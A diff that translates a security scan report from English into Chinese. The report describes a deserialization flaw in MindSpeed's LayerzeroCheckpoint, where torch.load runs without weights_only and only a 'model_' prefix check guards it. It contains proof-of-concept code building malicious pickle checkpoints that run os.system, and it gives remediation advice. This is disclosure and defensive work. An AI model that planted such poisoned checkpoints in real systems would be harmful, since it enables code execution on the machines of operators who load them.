@@ -1,64 +1,64 @@
-# Deserialization Vulnerability: Unsafe torch.load with Inadequate Filename Prefix Filter
+# VULN-SEC-LZ-003：LayerZero Checkpoint文件名前缀检查无效致torch.load RCE
 
-## Vulnerability Summary
+## 漏洞概要
 
-| Field | Value |
-|-------|-------|
-| **Vulnerability ID** | VULN-SEC-LZ-003 |
-| **CWE** | CWE-502: Deserialization of Untrusted Data |
-| **CVE Reference** | CVE-2025-32434 (PyTorch torch.load) |
-| **Severity** | High |
-| **CVSS Score** | 7.8 (High) |
-| **File** | mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py |
-| **Line(s)** | 55, 110, 127, 135 |
-| **Function** | LayerzeroCheckpoint class (multiple methods) |
-| **Sink** | torch.load() without weights_only=True |
+| 字段 | 值 |
+|------|-----|
+| **漏洞ID** | VULN-SEC-LZ-003 |
+| **CWE** | CWE-502：不可信数据反序列化 |
+| **CVE 参考** | CVE-2025-32434 (PyTorch torch.load) |
+| **严重性** | High |
+| **CVSS评分** | 7.8 (High) |
+| **文件** | mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py |
+| **行号** | 55, 110, 127, 135 |
+| **函数** | LayerzeroCheckpoint 类（多个方法） |
+| **危险点** | torch.load() 无 weights_only=True |
 
-## Description
+## 漏洞描述
 
-The `LayerzeroCheckpoint` class uses `torch.load()` to deserialize checkpoint files without the `weights_only=True` parameter. The only "mitigation" is a filename prefix check ("model_"), which provides **no security whatsoever**. An attacker who can write to the checkpoint directory can trivially bypass this check by naming their malicious file with the "model_" prefix.
+`LayerzeroCheckpoint` 类使用 `torch.load()` 反序列化 checkpoint 文件时未设置 `weights_only=True` 参数。唯一的"缓解措施"是文件名前缀检查（"model_"），这**完全不提供安全性**。能写入 checkpoint 目录的攻击者可轻松绕过此检查，只需将恶意文件命名为 "model_" 前缀。
 
-### Vulnerable Code Analysis
+### 漏洞代码分析
 
-**Entry Point** - Line 91-96:
+**入口点** - 第 91-96 行：
 ```python
 class LayerzeroCheckpoint(object):
     def __init__(self, ckpt_dir):
         self.ckpt_dir = ckpt_dir
         self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)  # MODEL_FILE_KEY = "model_"
         self.global_state = {}
-        self._build_global_state()  # VULNERABLE: loads files from untrusted source
+        self._build_global_state()  # 漏洞点：从不可信来源加载文件
 ```
 
-**Inadequate Mitigation** - Line 141-147:
+**不充分的缓解措施** - 第 141-147 行：
 ```python
 def _get_files_by_key(self, ckpt_dir, key):
     file_list = []
     for root, _, files in os.walk(ckpt_dir):
         for file in files:
-            if file.startswith(key):  # ONLY checks filename prefix!
+            if file.startswith(key):  # 仅检查文件名前缀！
                 file_list.append(os.path.join(root, file))
     return file_list
 ```
 
-**Sink - Unsafe Deserialization** - Line 110:
+**危险点 - 不安全反序列化** - 第 110 行：
 ```python
 def _build_global_state(self):
-    sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))  # NO weights_only=True!
+    sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))  # 无 weights_only=True！
 ```
 
-**Additional Vulnerable Sinks** - Line 55 (ShardStateDict class):
+**附加危险点** - 第 55 行（ShardStateDict 类）：
 ```python
 def _init_metadata(self):
-    state_dict = torch.load(self.filename, map_location='cpu')  # NO weights_only=True!
+    state_dict = torch.load(self.filename, map_location='cpu')  # 无 weights_only=True！
 ```
 
-## Attack Vector Analysis
+## 攻击向量分析
 
-### Attack Scenario
+### 攻击场景
 
-1. **Attacker gains write access** to checkpoint directory (e.g., compromised model repository, malicious insider, supply chain attack)
-2. **Attacker creates malicious checkpoint file** named `model_exploit.pt` with embedded pickle payload:
+1. **攻击者获得写入权限**到 checkpoint 目录（如被入侵的模型仓库、恶意内部人员、供应链攻击）
+2. **攻击者创建恶意 checkpoint 文件**命名为 `model_exploit.pt`，包含嵌入的 pickle payload：
    ```python
    import torch
    import pickle
@@ -68,7 +68,7 @@ def _init_metadata(self):
            import os
            return (os.system, ('id > /tmp/pwned',))
    
-   # Create malicious checkpoint
+   # 创建恶意 checkpoint
    malicious_data = {
        'iteration': 100,
        'args': type('Args', (), {'num_layers': 12, 'pipeline_model_parallel_size': 1})(),
@@ -78,27 +78,27 @@ def _init_metadata(self):
    }
    torch.save(malicious_data, 'model_exploit.pt')
    ```
-3. **Operator runs conversion tool**:
+3. **运维人员运行转换工具**：
    ```bash
    python convert_to_megatron.py --input_folder ./checkpoints --output_folder ./output
    ```
-4. **Malicious code executes** when `torch.load()` deserializes the file
+4. **恶意代码在 `torch.load()` 反序列化文件时执行**
 
-### Why the Prefix Check Fails
+### 前缀检查为何失败
 
-| Assumed Protection | Reality |
-|-------------------|---------|
-| Only legitimate checkpoint files pass filter | Any file starting with "model_" passes |
-| Attacker cannot predict filter | Filter is trivial to satisfy: `model_evil.pt` |
-| Provides security boundary | Provides ZERO security - just a naming convention |
+| 假设保护 | 实际情况 |
+|----------|----------|
+| 仅合法 checkpoint 文件通过过滤 | 任何以 "model_" 开头的文件都能通过 |
+| 攻击者无法预测过滤 | 过滤极易满足：`model_evil.pt` |
+| 提供安全边界 | 提供**零安全性** - 仅是命名约定 |
 
-## Proof of Concept
+## 概念验证
 
 ```bash
-# Attacker in checkpoint directory
+# 攻击者进入 checkpoint 目录
 cd /path/to/checkpoints/
 
-# Create malicious checkpoint (passes "model_" prefix check)
+# 创建恶意 checkpoint（通过 "model_" 前缀检查）
 python3 << 'EOF'
 import torch
 
@@ -115,123 +115,123 @@ payload = {
     'shard_state_dict': {},
     'model': RCE()
 }
-torch.save(payload, 'model_malicious.pt')  # Passes prefix filter!
+torch.save(payload, 'model_malicious.pt')  # 通过前缀过滤！
 EOF
 
-# When operator runs:
+# 当运维人员运行：
 # python convert_to_megatron.py --input_folder /path/to/checkpoints --output_folder /output
-# -> Code execution occurs
+# -> 代码执行发生
 ```
 
-## Data Flow
+## 数据流
 
 ```
-User Input (--input_folder)
+用户输入 (--input_folder)
         │
         ▼
 ┌─────────────────────────────────────────────────────────┐
 │  LayerzeroCheckpoint.__init__(ckpt_dir)                 │
 │  ├─ self._get_files_by_key(ckpt_dir, "model_")          │
-│  │   └─ Files matching "model_*" → self.file_list       │
-│  │      [NO SECURITY: Attacker controls filename!]      │
+│  │   └─ 匹配 "model_*" 的文件 → self.file_list          │
+│  │      [无安全：攻击者控制文件名！]                      │
 │  └─ self._build_global_state()                          │
 │      └─ torch.load(self.file_list[0])                   │
 │          └─ pickle.loads() → RCE                        │
 └─────────────────────────────────────────────────────────┘
 ```
 
-## Impact Assessment
+## 影响评估
 
-| Impact | Description |
-|--------|-------------|
-| **Confidentiality** | Complete - Attacker can read any file accessible to the process |
-| **Integrity** | Complete - Attacker can modify any data accessible to the process |
-| **Availability** | Complete - Attacker can crash the process or cause denial of service |
-| **Scope** | Limited to contexts where attacker can write to checkpoint directories |
+| 影响 | 描述 |
+|------|------|
+| **机密性** | 完全 - 攻击者可读取进程可访问的任意文件 |
+| **完整性** | 完全 - 攻击者可修改进程可访问的任意数据 |
+| **可用性** | 完全 - 攻击者可崩溃进程或导致拒绝服务 |
+| **范围** | 仅限于攻击者可写入 checkpoint 目录的上下文 |
 
-### Attack Prerequisites
+### 攻击前提条件
 
-1. Write access to checkpoint directory (or ability to supply malicious checkpoint files)
-2. Victim executes `convert_to_megatron.py` or instantiates `LayerzeroCheckpoint` with compromised directory
+1. checkpoint 目录写入权限（或能提供恶意 checkpoint 文件）
+2. 受害者执行 `convert_to_megatron.py` 或以被入侵目录实例化 `LayerzeroCheckpoint`
 
-### Common Attack Surfaces
+### 常见攻击面
 
-- Compromised model repositories (HuggingFace, model zoos)
-- Malicious insider with file system access
-- Supply chain attacks on checkpoint files
-- Shared filesystems in multi-tenant environments
-- CI/CD pipelines that process external checkpoints
+- 被入侵的模型仓库（HuggingFace、模型仓库）
+- 有文件系统访问权限的恶意内部人员
+- checkpoint 文件的供应链攻击
+- 多租户环境的共享文件系统
+- 处理外部 checkpoint 的 CI/CD 管道
 
-## Related Vulnerabilities
+## 相关漏洞
 
-This file contains multiple similar vulnerabilities:
+此文件包含多个类似漏洞：
 
-| Line | Method | Issue |
-|------|--------|-------|
-| 55 | `ShardStateDict._init_metadata` | Unsafe torch.load on `self.filename` |
-| 110 | `LayerzeroCheckpoint._build_global_state` | Unsafe torch.load on `self.file_list[0]` |
-| 127-128 | `LayerzeroCheckpoint.get_iteration` | Unsafe torch.load (references undefined `self.mp_rank_files`) |
-| 135-136 | `LayerzeroCheckpoint.get_args` | Unsafe torch.load (references undefined `self.mp_rank_files`) |
+| 行号 | 方法 | 问题 |
+|------|------|------|
+| 55 | `ShardStateDict._init_metadata` | 对 `self.filename` 的不安全 torch.load |
+| 110 | `LayerzeroCheckpoint._build_global_state` | 对 `self.file_list[0]` 的不安全 torch.load |
+| 127-128 | `LayerzeroCheckpoint.get_iteration` | 不安全 torch.load（引用未定义的 `self.mp_rank_files`） |
+| 135-136 | `LayerzeroCheckpoint.get_args` | 不安全 torch.load（引用未定义的 `self.mp_rank_files`） |
 
-See also: **VULN-SEC-LZ-002** (ShardStateDict._init_metadata in same file)
+参见：**VULN-SEC-LZ-002**（同文件中的 ShardStateDict._init_metadata）
 
-## Remediation
+## 修复建议
 
-### Primary Fix: Use weights_only=True
+### 主要修复：使用 weights_only=True
 
 ```python
-# BEFORE (Vulnerable)
+# 修复前（有漏洞）
 sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))
 
-# AFTER (Secure)
+# 修复后（安全）
 sd = torch.load(self.file_list[0], map_location=torch.device('cpu'), weights_only=True)
 ```
 
-**Note**: This requires checkpoint files to contain only tensor data. If checkpoints contain custom objects, they must be refactored.
+**注意**：这要求 checkpoint 文件仅包含张量数据。若 checkpoint 包含自定义对象，必须重构。
 
-### Secondary Fix: Add File Validation
+### 次要修复：添加文件验证
 
 ```python
 import hashlib
 
 def _validate_checkpoint_file(self, filepath: str, expected_hash: str = None) -> bool:
-    """Validate checkpoint file integrity."""
+    """验证 checkpoint 文件完整性。"""
     if expected_hash:
         with open(filepath, 'rb') as f:
             file_hash = hashlib.sha256(f.read()).hexdigest()
         if file_hash != expected_hash:
-            raise ValueError(f"Checksum mismatch for {filepath}")
+            raise ValueError(f"{filepath} checksum 不匹配")
     return True
 
 def _build_global_state(self):
-    # Validate first file
+    # 验证第一个文件
     self._validate_checkpoint_file(self.file_list[0])
     sd = torch.load(self.file_list[0], map_location=torch.device('cpu'), weights_only=True)
-    # ... rest of method
+    # ... 方法其余部分
 ```
 
-### Tertiary Fix: Use Safetensors Format
+### 第三修复：使用 Safetensors 格式
 
 ```python
 from safetensors.torch import load_file
 
-# Replace torch.load with safetensors (no pickle, no code execution)
-sd = load_file(self.file_list[0])  # Safe deserialization
+# 用 safetensors 替换 torch.load（无 pickle，无代码执行）
+sd = load_file(self.file_list[0])  # 安全反序列化
 ```
 
-## References
+## 参考资料
 
-- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
-- [CVE-2025-32434: PyTorch torch.load vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
-- [PyTorch Security Advisory: torch.load weights_only](https://pytorch.org/docs/stable/generated/torch.load.html)
-- [Project SECURITYNOTE.md](docs/zh/SECURITYNOTE.md) - Acknowledges CVE-2025-32434 risk
-- [Similar VULN-SEC-LZ-002](scan-results/details/VULN-SEC-LZ-002.md) - Same file, ShardStateDict class
+- [CWE-502：不可信数据反序列化](https://cwe.mitre.org/data/definitions/502.html)
+- [CVE-2025-32434：PyTorch torch.load 漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
+- [PyTorch 安全公告：torch.load weights_only](https://pytorch.org/docs/stable/generated/torch.load.html)
+- [项目 SECURITYNOTE.md](docs/zh/SECURITYNOTE.md) - 承认 CVE-2025-32434 风险
+- [类似 VULN-SEC-LZ-002](scan-results/details/VULN-SEC-LZ-002.md) - 同文件，ShardStateDict 类
 
-## Verification
+## 验证
 
-To verify this vulnerability:
+验证此漏洞：
 
-1. Create a malicious checkpoint file:
+1. 创建恶意 checkpoint 文件：
    ```bash
    python3 -c "
    import torch
@@ -241,17 +241,17 @@ To verify this vulnerability:
    torch.save({'model': POC()}, 'model_poc.pt')"
    ```
 
-2. Run the conversion tool:
+2. 运行转换工具：
    ```bash
    python -c "
    from mindspeed.core.distributed.layerzero.state.scripts.layerzero_checkpointer import LayerzeroCheckpoint
    LayerzeroCheckpoint('./')"
    ```
 
-3. If "VULN-SEC-LZ-003_CONFIRMED" is printed, the vulnerability is confirmed.
+3. 若打印 "VULN-SEC-LZ-003_CONFIRMED"，漏洞确认。
 
 ---
 
-**Status**: Confirmed Vulnerability  
-**Discovered**: 2024  
-**Last Updated**: 2024
+**状态**：已确认漏洞  
+**发现时间**：2024  
+**最后更新**：2024
